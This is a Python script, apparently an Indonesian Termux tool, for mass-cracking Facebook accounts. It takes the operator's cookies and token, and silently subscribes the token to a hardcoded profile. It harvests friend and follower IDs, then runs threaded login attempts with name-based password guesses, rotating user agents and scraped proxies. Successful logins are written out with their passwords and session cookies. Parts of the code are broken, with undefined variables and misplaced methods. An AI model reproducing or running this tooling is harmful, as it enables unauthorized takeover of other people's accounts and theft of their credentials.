#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')


#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
# KUMPULAN WARNA
M = '\x1b[1;97m' # MERAH
H = '\x1b[1;97m' # HIJAU
K = '\x1b[1;97m' # KUNING
B = '\x1b[1;97m' # BIRU
U = '\x1b[1;97m' # UNGU
O = '\x1b[1;97m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\x1b[1;97m' # ORANGE
N = '\x1b[1;97m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="•"

#warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
U = ('\x1b[1;97m')

ok, cp, id, user, pwx, loop = [], [], [], [], [], 0

sys.stdout.write('\x1b[1;35m\x1b]2; SC BY : FAIZAL.NA \x07')

# JALAN
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)

# FOLDER
def folder():
	try:os.mkdir('IG')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass

# LOGO (LO GOBLOK)
dt = requests.get("http://ip-api.com/json/").json()
try:
	IP = dt["query"]
	CN = dt["as"]
except KeyError:
	IP = " "
	CN = " \n"

#menu owner
print ('═════════════════════════ ')
author = 'sc by faizal N.A'
fb_me = 'Faizal Noor Arifin'
whatsap = 'https://github.com/faizal-na'
print ('════════════════════════ ')

def banner():
	os.system('clear')
	logo = (f'# • Author : {author} •')
	play = rich.markdown.Markdown(logo, style='green')
	rich.console.Console().print(play)
	print (' %s%s%s%s%s%s                                      %s%s%s%s%s%s\n%s   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n%s   |_____  |    \\_ |     | |_____  |    \\_\n\n %s%s%s%s%s%s                                      %s%s%s%s%s%s \n %s# %sFb  %s : %s%s \n %s# %sGit%s  : %s%s \n %s# %s════════════════════════════════ %s#  '%
	(M,til,K,til,H,til,M,til,K,til,H,til,M,P,M,til,K,til,H,til,M,til,K,til,H,til,U,O,M,O,fb_me,U,O,M,O,whatsap,P,M,P))
	print (' %s#%s IP   %s:%s %s %s- %s%s '%(U,O,M,O,IP,H,O,CN))
    
# CONVERT COOKIE DICT TO STRING
def romz_xyz(cookie,venom={}):
	for x in cookie.replace(' ','').strip().split(';'):
		kuki = x.split('=')
		if len(kuki) > 1:
			venom.update({kuki[0]: kuki[1]})
	return venom

#MENU MASUK
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t©©© 😝Semoga Teu Meunang😝 ©©©'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1));bot()
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{h} LOGIN DONE CROT.........KETIK DEUI python asu.py!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL MOMOK.....COKIES MODARRRR !!%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
		
# MENU PILIHAN INI AJG
class Menu():
	
	def __init__(self,url):
		self.url = url
		
	def tentang(self):
		try:
			kueh = romz_xyz(open("data/cookies","r").read().strip())
		except IOError:
			os.system("rm -rf data/cookies && rm -rf data/token && rm -rf data/my_info")
			print ("%s%s cookie invalid "%(M,til));jeda(2)
			os.system('python bff-2.py')
		try:
			tentang = json.loads(open("data/my_info","r").read().strip())
		except FileNotFoundError:
			#from data import informasi
			(kueh, requests.get("https://mbasic.facebook.com/profile.php?v=info",cookies = kueh).text)
			os.system('python bff-2.py')
		try:
			a = requests.get(f"{self.url}/profile.php", cookies = kueh).text
		except requests.exceptions.ConnectionError:
			exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		if "mbasic_logout_button" not in a:
			os.system("rm -rf data/cookies && rm -rf data/token && rm -rf data/my_info")
			print ("%s%s cookie invalid "%(M,til));jeda(2)
			os.system('python bff-2.py')
		else:
			banner()
			print(f"{B} # {H}WhatsApp{M} : {K}08577727xxxx")
			print(f"{B} # COOKIE{M} : YA\n")
			print ('%s [%s01%s] %sCrack dari daftar teman '%(H,P,H,O))
			print ('%s [%s02%s] %sCrack dari total pengikut'%(H,P,H,O))
			print ('%s [%s03%s] %sCrack user instagram %spro'%(H,P,H,O,H))
			print ('%s [%s04%s] %sLihat hasil crack'%(H,P,H,O))
			print ('%s [%s05%s] %sCheckpoint detektor'%(H,P,H,O))
			print ('%s [%srm%s] %sHapus data login'%(H,P,H,O))
			print ('%s [%s00%s] %sKeluar %s(%slogout%s)'%(H,P,H,O,P,M,P))
		
class pilihan:
	
	def __init__(self):
		self.kueh = romz_xyz(open("data/cookies","r").read().strip())
		try:
			self.token = open("data/token.txt","r").read()
		except FileNotFoundError:
			os.system("rm -rf data/cookies && rm -rf data/token && rm -rf data/my_info")
			os.system('clear')
			print ("%s%s cookie invalid "%(M,til));jeda(2)
			os.system('python bff-2.py')
		self.url = ("https://mbasic.facebook.com")
		self.id = []
				
	def menu(self):
		Menu(self.url).tentang()
		slut = input('\n%s# %sPilih %s> %s'%(P,O,M,K))
		if slut in['',' ']:
			print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			self.menu()
		elif slut in['1','01']:
			gan = input ("\n%s%s%s ingin crack massal id? y/t%s >%s "%(U,til,O,M,K))
			if gan in[""]:
				print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			elif gan in['y','Y']:
				try:
					token = self.token
					self.MassalGRAPH(token)
				except KeyError:
					exit('\n%s%s gagal mengambil id '%(M,til))
			elif gan in['t','T']:
				print ("\n%s%s %sPastikan daftar teman bersifat publik "%(U,til,O))
				idt = input('%s%s %sUsername/Id%s > %s'%(U,til,O,M,K))
				if idt in[""," "]:
					print ('\n%s%s isi yang benar'%(M,til));jeda(2)
				elif(re.findall("\w+",idt)):
					r = requests.get("https://mbasic.facebook.com/"+idt).text
					try:
						user = re.findall('\;rid\=(\d+)\&',str(r))[0]
					except:
						user = idt
					try:
						print ('')
						token = self.token
						self.PublikGRAPH(user, token)
					except KeyError:
						exit('\n%s%s gagal mengambil id '%(M,til))
		elif slut in['2','02']:
			print ("\n%s%s %sPastikan target terdapat pengikut nya "%(U,til,O))
			idt = input('%s%s %sUsername/Id%s > %s'%(U,til,O,M,K))
			if idt in[""," "]:
				print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			else:
				data_ = (f"{self.url}/{idt}?v=followers")
			try:
				response = requests.get(data_, cookies=self.kueh).text
				if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in response:
					exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
				elif "Halaman yang Anda minta tidak ditemukan." in response:
					exit('\n%s%s Id tidak ditemukan '%(M,til))
				elif "Konten Tidak Ditemukan" in response:
					exit('\n%s%s Id tidak ditemukan '%(M,til))
				else:
					#print (f"{U}{til}{O} Nama akun {M}>{K} "+re.findall("\<title\>(.*?)<\/title\>",response)[0])
					print ('')
					self.FollowersPAR(data_)
			except requests.exceptions.ConnectionError:
				exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		elif slut in['3','03']:
			checkin()
		elif slut in['4','04']:
			print ("\n%s%s%s 01 %sCek hasil akun facebook "%(U,til,P,O))
			print ("%s%s%s 02 %sCek hasil akun instagram "%(U,til,P,O))
			print ("%s%s%s 03 %sHapus hasil crack "%(U,til,P,O))
			print ("%s%s%s 00 %sKembali "%(U,til,M,O))
			rom = input('\n%s# %sPilih %s> %s'%(P,O,M,K))
			cek_cek(rom)
		elif slut in['5','05']:
			file_cp()
		elif slut in['RM','Rm','rm']:
			print ('\n%s%s menghapus data login dari termux '%(M,til));jeda(1)
			try:
				os.remove("data/cookies")
				os.remove("data/token.txt")
				os.remove("data/my_info")
			except:
				os.system("rm -rf data/cookie && rm -rf data/token && rm -rf data/my_info")
			jalan('\n%s√ berhasil terhapus '%(H))
			exit()
		elif slut in['0','00']:
			exit ('\n')
		
		if len(self.id)!=0:
			print
			return Crack().romiy(self.id)
		#else:
			#exit (f'{M}{til} gagal mengambil ID ')
			
	# CRACK MASSAL
	def MassalGRAPH(self, token):
		try:
			jum = int(input('%s%s %sJumlah target%s > %s'%(U,til,O,M,K)))
			print ("\n%s%s %sPastikan daftar teman bersifat publik "%(U,til,O))
		except:jum=1
		for t in range(jum):
			t +=1
			idt = input('%s%s %sUsername/Id %s%s%s > %s'%(U,til,O,P,t,M,K))
			if idt in['']:
				print
			elif(re.findall("\w+",idt)):
				r = requests.get("https://mbasic.facebook.com/"+idt).text
				try:
					user = re.findall('\;rid\=(\d+)\&',str(r))[0]
				except:
					user = idt
		
			po = requests.get(f'https://graph.facebook.com/{user}?fields=name,friends.fields(id,name)&access_token={token}').json()
			for i in po['friends']['data']:
				self.id.append(f"{i['id']}<=>{i['name']}")
		try:
			print ('')
			print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
		except:
			pass
						
	# CRACK PUBLIK 
	def PublikGRAPH(self, user, token):
		try:
			po = requests.get(f'https://graph.facebook.com/{user}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}').json()
			for i in po['friends']['data']:
				self.id.append(f"{i['id']}<=>{i['name']}")
				print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
		except:
			pass
			
	# CRACK FOLLOWERS
	def FollowersPAR(self, data_):
		try:
			respon = requests.get(data_, cookies = self.kueh).text
			otw = re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>', respon) 
			for i in otw:
				if "&amp;refid=" in i[0]:
					self.id.append(re.findall("id=(.*?)&",i[0])[0]+"<=>"+i[1])
				elif "profile.php?" in i[0]:
					self.id.append(re.findall("id=(.*)",i[0])[0]+"<=>"+i[1])
				elif "?refid=" in i[0]:
					self.id.append(re.findall("(.*?)\?refid=",i[0])[0]+"<=>"+i[1])
				else:
					self.id.append(i[0]+"<=>"+i[1])
				print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
			if "Lihat Selengkapnya" in respon:
				self.FollowersPAR(self.url+parser(respon,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:
			pass
			
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 10; Redmi 01A Build/01AQKQ1.191014.001; wv)'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; Android 10; Redmi 01A Build/01AQKQ1.191014.001; wv)'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (Linux; Android 10; Redmi 01A Build/01AQKQ1.191014.001; wv)'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('ua.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Faizal-NA/bam/blob/main/ua.txt').text
		ua=open('.ua.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.ua.txt','r').read().splitlines()
	
	# LANGSUNG
	def langsung(self):
		global pwx
		#from data import list_peweh
		suuu = input('\n%s#%s Pilih %s>%s '%(P,O,M,K))
		if suuu == '':
			print("%s%s Isi yang benar kentod "%(M,til))
			self.langsung()
		elif suuu in ('1', '01'):
			print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
			print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
			jalan ('\n%s!%s setiap crack 1k ID, mainkan mode pesawat 2 detik \n'%(U,O));jeda(0.2)
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						na = name.split(' ')
						if len(na) == 1:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 2:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 3:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 4:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						else:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						TitidNeverDie.submit(self.touch, uid, pwx)
					except: pass
			hasil(ok,cp)
		elif suuu in ('2', '02'):
			print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
			print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
			jalan ('\n%s!%s setiap crack 1k ID, mainkan mode pesawat 2 detik \n'%(U,O));jeda(0.2)
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						na = name.split(' ')
						if len(na) == 1:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 2:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 3:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 4:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						else:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						TitidNeverDie.submit(self.basic, uid, pwx)
					except: pass
			hasil(ok,cp)
		elif suuu in ('3', '03'):
			print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
			print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
			jalan ('\n%s!%s setiap crack 1k ID, mainkan mode pesawat 2 detik \n'%(U,O));jeda(0.2)
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						na = name.split(' ')
						if len(na) == 1:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 2:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 3:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 4:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						else:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						TitidNeverDie.submit(self.mobil, uid, pwx)
					except: pass
			hasil(ok,cp)
		else:
			print("%s%s Isi yang benar kentod "%(M,til))
			self.langsung()
			
	# TOUCH
	def touch(self, user, manual, **data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;96m [plis tungguan anjing] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s%s%s]'%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
				headers_ = {"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				p = ses.get('https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://free.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				if "c_user" in ses.cookies.get_dict():
					try:
						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s[ID:] %s /\ %s /\ %s %s %s /\ %s '%(H,user,pw,day,month,year,kukis))
						#os.popen("play-audio dapet.mp3")
						ok.append("%s /\ %s /\ %s %s %s /\ %s "%(user,pw,day,month,year,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" [ID:] %s /\ %s /\ %s %s %s /\%s \n"%(user,pw,day,month,year,kukis))
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s[ID] %s [PSW] %s /\ %s '%(H,user,pw,kukis))
					#os.popen("play-audio dapet.mp3")
					ok.append('%s /\ %s /\ %s'%(user,pw,kukis))
					open('OK/%s.txt'%(waktu), 'a').write(' [ID:] %s [PSW] %s /\ %s\n'%(user,pw,kukis))
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s[checkpoint] %s [PSW] %s /\ %s %s %s  '%(K,user,pw,day,month,year))
						#os.popen("play-audio dapet.mp3")
						cp.append("%s /\ %s /\ %s %s %s"%(user,pw,day,month,year))
						open('CP/%s.txt' %(waktu), 'a').write(" [checkpoint] %s [PSW] %s /\ %s %s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s[checkpoint] %s /\ %s           '%(K,user,pw))
					#os.popen("play-audio dapet.mp3")
					cp.append('%s /\ %s'%(user,pw))
					open('CP/%s.txt' %(waktu), 'a').write(" [checkpoint] %s /\ %s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			jeda(1)
			loop += 1
			self.touch(user, manual, **data)
			
	# MBASIC
	def basic(self, user, manual,**data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;96m [plis tungguan anjing] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s%s%s]'%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
				headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
